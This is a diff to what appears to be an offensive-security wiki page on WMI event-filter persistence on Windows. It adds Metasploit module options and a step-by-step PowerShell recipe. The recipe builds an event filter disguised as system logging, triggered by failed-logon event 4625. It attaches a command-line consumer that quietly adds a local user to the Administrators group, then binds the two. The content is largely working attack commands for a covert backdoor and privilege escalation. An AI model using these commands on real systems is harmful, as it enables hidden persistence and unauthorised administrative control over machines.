@@ -1,11 +1,25 @@
----
-description: Page Under Construction
----
-
 # WMI Persist With Event Filters
+
+### Automation
 
 * There are many great automated ways to do this.
 * [https://github.com/Sw4mpf0x/PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)
+* Metasploit post module `exploit/windows/local/wmi_persistence`
+
+```
+Basic options:
+  Name                Current Setting  Required  Description
+  ----                ---------------  --------  -----------
+  CALLBACK_INTERVAL   1800000          yes       Time between callbacks (In milliseconds). (Default: 1800000).
+  CLASSNAME           UPDATER          yes       WMI event class name. (Default: UPDATER)
+  EVENT_ID_TRIGGER    4625             yes       Event ID to trigger the payload. (Default: 4625)
+  PERSISTENCE_METHOD  EVENT            yes       Method to trigger the payload. (Accepted: EVENT, INTERVAL, LOGON, PROCESS, WAITFOR)
+  PROCESS_TRIGGER     CALC.EXE         yes       The process name to trigger the payload. (Default: CALC.EXE)
+  SESSION                              yes       The session to run this module on.
+  USERNAME_TRIGGER    BOB              yes       The username to trigger the payload. (Default: BOB)
+  WAITFOR_TRIGGER     CALL             yes       The word to trigger the payload. (Default: CALL)
+
+```
 
 ### Manual Mode&#x20;
 
@@ -66,14 +80,39 @@ Logon/Logoff
 #### Create your own filter and consumer&#x20;
 
 ```
-$x='Our Filter'
-$x=
-$z='Our Consumer'
+$x='SCM System Log Filter'
+$z='SCM System Log Consumer'
 ```
 
 #### Now create the triggering event&#x20;
 
+```
+$q='Select * from __InstanceCreationEvent WITHIN 10 where TargetInstance isa 'Win32-NtLogEvent' and TargetInstance.logfile='Security' and (TargetInstance.EventCode='4625')"
+```
 
+#### Now create your event filter&#x20;
+
+```
+$wmifilter=Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$x;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$q} ErrorAction Stop
+```
+
+#### Create the event consumer&#x20;
+
+```
+$wmiconsumer=Set-WmiInstance -Class CommandLineEventConsumer -NameSpace "root\subscription" -Arguments @{Name=$z;CommandLineTemplate='C:\\Windows\\System32\\windowspowershell\\v.1.0\\powershell.exe -v 2.0 -nop -c "if(wevtutil qe security /rd:true /f:text /c:1 `"*[System/EventID=4625]`" | findstr /i "fake username here"){net localgroup Administrators <localuser> /add}"'}
+```
+
+#### Combine the filter and the comsumer&#x20;
+
+```
+Set-WmiInstance -Class __FilterToConsumerBinding -NameSpace "root\subscription" -Arguments @{Filter=$wmifilter;Consumer=$wmiconsumer}
+```
+
+#### Ensure Its all working and correct&#x20;
+
+```
+Get-WmiObject -Class __FilterToConsumerBinding -NameSpace "root\subscription"
+```
 
 ### IOCs Left Behind&#x20;
 
